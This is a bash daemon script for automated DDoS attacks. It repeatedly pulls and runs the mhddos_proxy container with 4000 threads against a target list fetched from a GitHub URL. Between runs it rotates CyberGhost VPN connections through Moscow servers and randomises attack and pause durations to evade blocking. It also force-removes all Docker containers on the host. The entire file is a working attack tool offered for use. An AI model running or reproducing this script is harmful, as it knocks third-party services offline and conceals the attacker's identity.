#!/bin/bash
#Prepared script for use as a system deamon in unix-based systems for automated ddos via docker with custom auto-changing vpn connection

#Defining some general variables
#duration="15m" #This is now randomly chosen as well
threads_count="-t 4000"
targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
more_params="-p 1200 --vpn --debug --http-methods GET STRESS"

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Removing any existing docker containers"
docker rm -f $(docker ps -a -q)

#head -n-6 is used to leave 414th cluster of servers untouched (5 servers)
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Reading the server list from the file"
readarray -t a < <(tail /home/admuser/cg-vpn/moscow_servers.txt -n+4 | head -n-6 | awk -F '|' '{gsub(" ", "", $4); print $4}')
a_length=${#a[@]}

#This is the main loop
while [ 1 == 1 ]
do
	for (( i=0; i<${a_length}; i++ ));
	do
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Closing any existing vpn connection"
		cyberghostvpn --stop
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Updating the docker image"
		docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
		#Getting random element from the array:
		serv=${a[$(shuf -i 0-$((${a_length}-1)) -n 1)]}
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Trying to connect to $serv from the server list"
		check=$(cyberghostvpn --traffic --country-code RU --city Moscow --server $serv --connect | tail -n-1)
		newip=$(curl ipinfo.io/ip)
		if [[ "$check" == "VPN connection established." ]]; then
			duration="$(shuf -i 12-18 -n 1)m"
			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Success: Connection to $serv is established, new IP is $newip, starting the execution for $duration"
			docker run --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params &> /home/admuser/daemon-prep/mhd.log &
			sleep $duration
			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Stopping the execution and removing the container"
			docker rm -f $(docker ps -a -q)
			chill_delay="$(shuf -i 3-8 -n 1)m"
			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Pause: Chilling for $chill_delay"
			sleep $chill_delay
		else
			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Fail: Error happened while connecting to vpn, retrying with another server in 30 seconds"
			sleep 30s
		fi
	done
done
